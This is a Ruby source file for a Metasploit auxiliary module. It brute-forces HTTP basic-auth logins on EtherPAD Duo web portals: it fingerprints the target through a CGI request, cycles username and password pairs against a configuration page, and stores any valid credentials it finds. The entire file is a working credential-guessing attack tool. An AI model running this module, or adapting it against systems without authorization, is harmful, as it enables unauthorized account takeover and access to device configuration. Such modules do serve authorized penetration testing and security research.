##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
    'Name'           => 'EtherPAD Duo Login Bruteforce Utility',
    'Description'    => %{
      This module scans for EtherPAD Duo login portal, and
      performs a login bruteforce attack to identify valid credentials.
    },
    'Author'         =>
      [
        'Karn Ganeshen <KarnGaneshen[at]gmail.com>',
      ],
    'License'        => MSF_LICENSE
    ))

    deregister_options('HttpUsername', 'HttpPassword')
  end

  def run_host(ip)
    unless is_app_epaduo?
      return
    end

    print_status("Starting login bruteforce...")
    each_user_pass do |user, pass|
      do_login(user, pass)
    end
  end

  #
  # What's the point of running this module if the target actually isn't EtherPAD Duo
  #

  def is_app_epaduo?
    begin
      res = send_request_cgi(
      {
        'uri'       => normalize_uri('/', 'CGI', 'mParseCGI'),
        'method'    => 'GET',
        'vars_get'  => {
          'file' => 'mainpage.html'
        }
      })
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
      vprint_error("HTTP Connection Failed...")
      return false
    end

    if (res and res.code == 200 and res.headers['Server'] =~ /EtherPAD/ and res.body.include?("EtherPAD Duo"))
      vprint_good("Running EtherPAD Duo application ...")
      return true
    else
      vprint_error("Application is not EtherPAD Duo. Module will not continue.")
      return false
    end
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: (ssl ? 'https' : 'http'),
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      last_attempted_at: DateTime.now,
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  #
  # Brute-force the login page
  #

  def do_login(user, pass)
    vprint_status("Trying username:#{user.inspect} with password:#{pass.inspect}")

    begin
      res = send_request_cgi(
      {
        'uri'       => normalize_uri('/', 'config', 'configindex.ehtml'),
        'method'    => 'GET',
        'authorization' => basic_auth(user, pass)
      })
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
      vprint_error("HTTP Connection Failed...")
      return :abort
    end

    if res && res.code == 200 && res.body.include?("Home Page") && res.headers['Server'] && res.headers['Server'].include?("EtherPAD")
      print_good("SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}")
      report_cred(ip: rhost, port: rport, user: user, password: pass, proof: res.body)
      return :next_user
    else
      vprint_error("FAILED LOGIN - #{user.inspect}:#{pass.inspect}")
    end
  end
end
